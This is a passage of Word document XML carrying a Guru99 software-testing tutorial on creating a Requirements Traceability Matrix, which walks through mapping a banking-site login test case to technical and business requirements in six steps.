          </w:rPr>
          <w:t>Guru99 banking project</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="760" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="761" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve">Here the scenario is that the customer should be able to login to Guru99 banking website with the correct password and </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>user#id</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> while manager should be able to login to the website through customer login page.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="060BA427" wp14:editId="07A517DB">
            <wp:extent cx="5821680" cy="2742130"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="68" name="Picture 68" descr="How to Create Requirements Traceability Matrix (RTM)">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w to Create Requirements Traceability Matrix (RTM)">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39175" cy="2750370"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="762" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="763" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="764" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>While the below table is our </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Technical Requirement Document (TRD)</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="765" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6390DC10" wp14:editId="475731CC">
            <wp:extent cx="4160520" cy="1432632"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="67" name="Picture 67" descr="How to Create Requirements Traceability Matrix (RTM)">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ow to Create Requirements Traceability Matrix (RTM)">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0520" cy="1432632"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="766" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="767" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:lastRenderedPageBreak/>
          <w:t>Note:</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> QA teams do not document the BRD and TRD. Also some companies use </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Function Requirement Documents (FRD)</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> which </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>are</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t xml:space="preserve"> similar to Technical Requirement Document but the process of creating Traceability Matrix remains the same.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="768" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="769" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Let's Go Ahead and create RTM Testing</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="770" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="771" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 1: </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Our</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:instrText xml:space="preserve"> HYPERLINK "https://www.guru99.com/test-case.html" </w:instrText>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:color w:val="04B8E6"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Test Case </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>is</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="772" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="773" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>"Verify Login, when correct ID and Password is entered, it should login successfully"</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="774" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="771E2CBB" wp14:editId="5BA70907">
            <wp:extent cx="5623560" cy="1290535"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="66" name="Picture 66" descr="How to Create Requirements Traceability Matrix (RTM)">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to Create Requirements Traceability Matrix (RTM)">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23560" cy="1290535"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="775" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="776" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="777" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="778" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 2</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>: Identify the Technical Requirement that this test case is verifying. For our test case, the technical requirement is T94 is being verified.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="779" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="32123E91" wp14:editId="00F6FF2C">
            <wp:extent cx="4396740" cy="1200380"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="65" name="Picture 65" descr="How to Create Requirements Traceability Matrix (RTM)">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ow to Create Requirements Traceability Matrix (RTM)">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6740" cy="1200380"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="780" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="781" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="782" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="783" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 3: </w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Note this Technical Requirement (T94) in the Test Case.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="784" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1EA7DAD5" wp14:editId="2882D86D">
            <wp:extent cx="6435943" cy="958053"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="64" name="Picture 64" descr="How to Create Requirements Traceability Matrix (RTM)">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to Create Requirements Traceability Matrix (RTM)">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4527" cy="965285"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="785" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="786" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="787" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="788" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 4:</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Identify the Business Requirement for which this TR (Technical Requirement-T94) is defined</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="789" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EB591AC" wp14:editId="56A23AED">
            <wp:extent cx="5364480" cy="1403018"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="63" name="Picture 63" descr="How to Create Requirements Traceability Matrix (RTM)">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Create Requirements Traceability Matrix (RTM)">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4480" cy="1403018"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="790" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="791" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="792" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="793" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 5:</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Note the BR (Business Requirement) in Test Case</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="794" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="795" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="796" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="28BB8A9D" wp14:editId="3DC16DD2">
            <wp:extent cx="6278880" cy="852687"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="62" name="Picture 62" descr="How to Create Requirements Traceability Matrix (RTM)">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to Create Requirements Traceability Matrix (RTM)">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9952" cy="855549"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:rPr>
          <w:ins w:id="797" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="798" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:rStyle w:val="Strong"/>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Step 6:</w:t>
        </w:r>
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t> Do above for all Test Cases. Later Extract the First 3 Columns from your Test Suite. RTM in testing is Ready!</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:ins w:id="799" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00234606">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="04B8E6"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="409EE163" wp14:editId="2A397379">
            <wp:extent cx="4701540" cy="1880616"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="61" name="Picture 61" descr="How to Create Requirements Traceability Matrix (RTM)">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to Create Requirements Traceability Matrix (RTM)">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1540" cy="1880616"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00234606">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="372" w:lineRule="atLeast"/>
        <w:rPr>
          <w:ins w:id="800" w:author="Unknown"/>
          <w:color w:val="343434"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="801" w:author="Unknown">
        <w:r w:rsidRPr="00234606">
          <w:rPr>
            <w:color w:val="343434"/>
            <w:sz w:val="20"/>
            <w:szCs w:val="20"/>
          </w:rPr>
          <w:t>Advantage of Requirement Traceability Matrix</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00234606" w:rsidRPr="00234606" w:rsidRDefault="00234606" w:rsidP="00F97FFE">
      <w:pPr>
